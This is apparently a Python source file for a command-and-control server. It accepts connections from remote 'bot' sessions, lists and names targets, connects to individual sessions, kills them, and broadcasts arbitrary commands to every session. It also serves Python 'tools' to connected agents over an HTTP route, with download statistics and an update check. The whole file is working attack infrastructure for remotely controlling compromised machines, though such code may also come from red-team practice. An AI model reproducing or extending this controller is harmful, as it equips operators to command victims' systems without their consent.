import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading
from banner import banner, Colour
from bot import Bot
import base64
from datetime import datetime
import zipfile
import requests

# Add tool hosting functionality
class ToolServer:
    def __init__(self):
        self.tools_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'agent_client', 'tools')
        self.tool_cache = {}
        self.tool_hashes = {}  # Store hashes for integrity checks
        self.tool_versions = {}  # Store tool versions
        self.tool_stats = {}  # Store usage statistics
        self.load_tools()

    def load_tools(self):
        """Load all tools from the tools directory"""
        for tool_file in os.listdir(self.tools_dir):
            if tool_file.endswith('.py'):
                tool_name = tool_file[:-3]
                tool_path = os.path.join(self.tools_dir, tool_file)
                
                with open(tool_path, 'rb') as f:
                    content = f.read()
                    # Store encoded content
                    self.tool_cache[tool_name] = base64.b64encode(content).decode()
                    # Store hash
                    self.tool_hashes[tool_name] = hashlib.sha256(content).hexdigest()
                    # Initialize stats
                    self.tool_stats[tool_name] = {
                        'downloads': 0,
                        'last_used': None,
                        'success_rate': 100.0
                    }
                    # Get version from file (assuming version is stored in __version__ variable)
                    try:
                        with open(tool_path, 'r') as f:
                            for line in f:
                                if line.startswith('__version__'):
                                    self.tool_versions[tool_name] = line.split('=')[1].strip().strip('"\'')
                                    break
                    except:
                        self.tool_versions[tool_name] = "unknown"
                
                print(Colour().green(f'[+] Loaded tool: {tool_name} (v{self.tool_versions[tool_name]})'))

    def get_tool(self, tool_name):
        """Get a tool's code and update stats"""
        if tool_name in self.tool_cache:
            self.tool_stats[tool_name]['downloads'] += 1
            self.tool_stats[tool_name]['last_used'] = datetime.now()
            return self.tool_cache[tool_name]
        return None

    def update_tool_status(self, tool_name, success):
        """Update tool success rate"""
        if tool_name in self.tool_stats:
            current_rate = self.tool_stats[tool_name]['success_rate']
            downloads = self.tool_stats[tool_name]['downloads']
            new_rate = ((current_rate * downloads) + (100 if success else 0)) / (downloads + 1)
            self.tool_stats[tool_name]['success_rate'] = new_rate

    def backup_tools(self):
        """Create a backup of all tools"""
        backup_file = f'tools_backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.zip'
        with zipfile.ZipFile(backup_file, 'w') as zipf:
            for tool_name in self.tool_cache:
                tool_path = os.path.join(self.tools_dir, f'{tool_name}.py')
                zipf.write(tool_path, f'{tool_name}.py')
        return backup_file

    def check_updates(self, repo_url):
        """Check for tool updates from a repository"""
        try:
            response = requests.get(f"{repo_url}/versions.json")
            if response.status_code == 200:
                remote_versions = response.json()
                updates_available = {}
                for tool, version in self.tool_versions.items():
                    if tool in remote_versions and remote_versions[tool] > version:
                        updates_available[tool] = remote_versions[tool]
                return updates_available
        except Exception as e:
            print(Colour().red(f"Failed to check updates: {e}"))
        return {}

# Add tool server routes to Bot class
def add_tool_routes(app):
    tool_server = ToolServer()

    @app.route('/tools/<tool_name>.py')
    def serve_tool(tool_name):
        tool_code = tool_server.get_tool(tool_name)
        if tool_code:
            return base64.b64decode(tool_code).decode()
        return 'Tool not found', 404

def c2_help_manual():
    print('''\n
    ===Command and Control (C2) Manual===

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions
    tools                   --> List available tools
    tool info *name*       --> Show detailed tool information
    tool backup            --> Create backup of all tools
    tool stats            --> Show tool usage statistics
    tool update           --> Check for tool updates
    \n''')

def initialise_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    return sock

def accept_connections():
    while True:
        if start_flag == False:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            print(target, ip)
            try:
                bot = Bot(target, ip)
                # Send available tools info to the agent
                tool_list = list(ToolServer().tool_cache.keys())
                bot.reliable_send({'type': 'tools', 'data': tool_list})
            except Exception as e:
                print(e)
                pass
            print(Colour().green(str(ip) + ' has connected!') +
                    '\n[**] Command & Control Center: ', end="")
        except:
            pass

def start_accepting_connections(sock):
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    return t1

def print_banner_and_initial_info():
    print(banner())
    print('Run "help" command to see the usage manual')
    print(Colour().green('[+] Waiting For The Incoming Connections ...'))

def print_command_does_not_exist():
    print(Colour().red('[!!] Command Doesn\'t Exist'), end=" - ")
    print(Colour.yellow('Try running `help` command'), end="\n")

def handle_keyboard_interrupt():
    print(Colour().blue('\nPlease use "exit" command'))

def handle_value_error(e):
    print(Colour().red('[!!] ValueError: ' + str(e)))

def list_targets():
    for i in Bot.botList:
        print('Session ' + str(Bot.botList[i].id) + ' --- ' + str(Bot.botList[i].ip) + ' --- ' + str(Bot.botList[i].alias))

def set_alias(command):
    session_id = int(command[5:])
    if session_id>=Bot.botCount:
        print('[-] No Session Under That ID Number.')
        return
    Bot.botList[session_id].alias = input('Enter new alias for session '+ str(session_id) + ':')
    print('Alias changed to ' + Bot.botList[session_id].alias)

def close_all_target_connections():
    for target in Bot.botList:
        Bot.botList[target].kill()

def join_thread(t1):
    t1.join()

def close_socket(sock):
    sock.close()
    start_flag = False

def exit_c2_server(sock, t1):
    close_socket(sock)
    join_thread(t1)
    print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))


def kill_target(command):
    target = int(command[5:])
    if target >= Bot.botCount:
        print('[-] No Session Under That ID Number.')
        return
    Bot.botList[target].kill()
    

def handle_session_command(command):
    try:
        session_id = int(command[7:])
        i = Bot.botList[session_id]
        i.communication()
    except Exception as e:
        print('[-] No Session Under That ID Number. Error: ', e)


def send_all(command):
    print(Colour.blue(f'Number of sessions {Bot.botCount}'))
    print(Colour.green('Target sessions!'))
    try:
        for target in Bot.botList:
            Bot.botList[target].reliable_send(command)
    except Exception as e:
        print(f'Failed to send command to all targets. Error: {e}')


def clear_c2_console():
    os.system('clear')

def list_tools():
    """List all available tools"""
    tool_server = ToolServer()
    print("\nAvailable Tools:")
    for tool in tool_server.tool_cache.keys():
        print(f"  - {tool}")
    print()

def show_tool_info(tool_name):
    """Show detailed information about a specific tool"""
    tool_server = ToolServer()
    if tool_name in tool_server.tool_cache:
        print(f"\nTool: {tool_name}")
        print(f"Version: {tool_server.tool_versions[tool_name]}")
        print(f"Hash: {tool_server.tool_hashes[tool_name]}")
        print("\nStatistics:")
        stats = tool_server.tool_stats[tool_name]
        print(f"Downloads: {stats['downloads']}")
        print(f"Success Rate: {stats['success_rate']:.1f}%")
        if stats['last_used']:
            print(f"Last Used: {stats['last_used'].strftime('%Y-%m-%d %H:%M:%S')}")
    else:
        print(Colour().red(f"Tool {tool_name} not found"))

def show_tool_stats():
    """Show statistics for all tools"""
    tool_server = ToolServer()
    print("\nTool Usage Statistics:")
    print("=" * 60)
    print(f"{'Tool':<20} {'Version':<10} {'Downloads':<10} {'Success Rate':<12} {'Last Used'}")
    print("-" * 60)
    for tool_name in tool_server.tool_cache:
        stats = tool_server.tool_stats[tool_name]
        last_used = stats['last_used'].strftime('%Y-%m-%d %H:%M:%S') if stats['last_used'] else 'Never'
        print(f"{tool_name:<20} {tool_server.tool_versions[tool_name]:<10} {stats['downloads']:<10} {stats['success_rate']:.1f}%      {last_used}")

def run_c2_server(sock, t1):
    global start_flag
    tool_server = ToolServer()
    
    while start_flag:
        try:
            command = input('[**] Command & Control Center: ')
            if command == 'targets':
                list_targets()
            elif command == 'tools':
                list_tools()
            elif command.startswith('tool info'):
                show_tool_info(command[10:])
            elif command == 'tool stats':
                show_tool_stats()
            elif command == 'tool backup':
                backup_file = tool_server.backup_tools()
                print(Colour().green(f"Tools backed up to {backup_file}"))
            elif command == 'tool update':
                updates = tool_server.check_updates("https://your-repo-url")
                if updates:
                    print("\nUpdates available:")
                    for tool, version in updates.items():
                        print(f"{tool}: v{version}")
                else:
                    print("All tools are up to date")
            elif command[:7] == 'session':
                handle_session_command(command)
            elif command[:5] == 'alias':
                set_alias(command)
            elif command == 'exit':
                close_all_target_connections()
                start_flag = exit_c2_server(sock, t1)
            elif command[:4] == 'kill':
                kill_target(command)
            elif command[:7] == 'sendall':
                send_all(command)
            elif command[:4] == 'help':
                c2_help_manual()
            elif command[:9] == 'heartbeat':
                continue
            elif command == 'heartbeat_all':
                continue
            else:
                print_command_does_not_exist()
        except (KeyboardInterrupt, SystemExit):
            handle_keyboard_interrupt()
        except ValueError as e:
            handle_value_error(e)


if __name__ == '__main__':
    start_flag = True
    sock = initialise_socket()
    
    # Initialize tool server
    tool_server = ToolServer()
    print(Colour().green('[+] Tool server initialized'))
    
    t1 = start_accepting_connections(sock)
    print_banner_and_initial_info()
    run_c2_server(sock, t1)